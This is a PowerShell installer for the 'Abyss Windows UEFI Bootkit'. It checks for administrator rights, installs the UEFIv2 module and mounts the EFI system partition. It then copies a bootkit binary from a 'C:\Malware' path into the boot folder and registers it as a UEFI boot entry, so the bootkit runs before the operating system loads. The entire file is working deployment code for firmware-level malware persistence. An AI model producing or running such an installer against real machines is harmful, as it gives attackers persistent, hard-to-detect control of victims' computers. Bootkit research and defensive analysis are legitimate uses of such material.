<#
.SYNOPSIS
Installs a UEFI boot entry pointing to the Abyss Windows UEFI Bootkit on the ESP.

.DESCRIPTION
Mounts the ESP using mountvol, copies the AbyssBootkit1UEFIApplication.efi binary,
removes any previous entry with the same name, creates a new UEFI boot entry using UEFIv2 module.
#>

param (
	[string]$EfiFile = "C:\Malware\AbyssBootkit1UEFIApplication.efi",
	[string]$EfiTargetPath = "\EFI\Boot\AbyssBootkit1UEFIApplication.efi",
	[string]$EntryName = "Abyss Windows UEFI Bootkit"
)

Write-Host ""
Write-Host "=============================================="
Write-Host "       Abyss Windows UEFI Bootkit Installer"
Write-Host "=============================================="
Write-Host ""

# Check for admin rights
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
	[Security.Principal.WindowsBuiltInRole] "Administrator")) {
	Write-Host "[-] This script must be run as Administrator. Aborting."
	exit 1
}

# Check and install UEFIv2 module if missing
if (-not (Get-Module -ListAvailable -Name UEFIv2)) {
	Write-Host "[*] UEFIv2 module not found. Attempting to install from PSGallery."
	try {
		Install-Module -Name UEFIv2 -Force -Scope CurrentUser -AllowClobber
		Write-Host "[+] UEFIv2 module installed successfully."
	} catch {
		Write-Host "[-] Failed to install UEFIv2 module. Please install it manually and re-run this script."
		exit 1
	}
} else {
	Write-Host "[+] UEFIv2 module already installed."
}

Import-Module UEFIv2

# Mount ESP
Write-Host "[*] Mounting ESP partition to drive U:"
mountvol U: /s
Start-Sleep -Seconds 1

if (-not (Test-Path "U:\")) {
	Write-Host "[-] Failed to mount ESP partition. Aborting."
	exit 1
}

Write-Host "[+] ESP partition mounted at U:"

# Ensure target folder exists
$targetFolder = Split-Path -Path $EfiTargetPath
if (-not (Test-Path "U:$targetFolder")) {
	Write-Host "[*] Creating target folder: U:$targetFolder"
	New-Item -ItemType Directory -Path "U:$targetFolder" -Force | Out-Null
}

# Copy EFI binary
Write-Host "[*] Copying EFI binary to ESP: $EfiFile -> U:$EfiTargetPath"
Copy-Item -Path $EfiFile -Destination "U:$EfiTargetPath" -Force
Write-Host "[+] EFI binary copied successfully."

# Remove existing boot entry with same name
$existing = Get-UEFIBootEntry | Where-Object { $_.Description -eq $EntryName }
if ($null -ne $existing) {
	Write-Host "[*] Existing UEFI boot entry '$EntryName' found. Removing."
	Remove-UEFIBootEntry -Id $existing.Id -Confirm:$false
	Write-Host "[+] Existing UEFI boot entry removed."
}

# Add UEFI boot entry
Write-Host "[*] Creating UEFI boot entry: '$EntryName' "
Add-UEFIBootEntry -Name $EntryName -FilePath $EfiTargetPath
Write-Host "[+] UEFI boot entry '$EntryName' created."

# Unmount ESP
Write-Host "[*] Unmounting ESP from U:"
mountvol U: /d
Write-Host "[+] ESP unmounted successfully."

# Done
Write-Host "[+] All done. You can reboot and test your new boot entry."
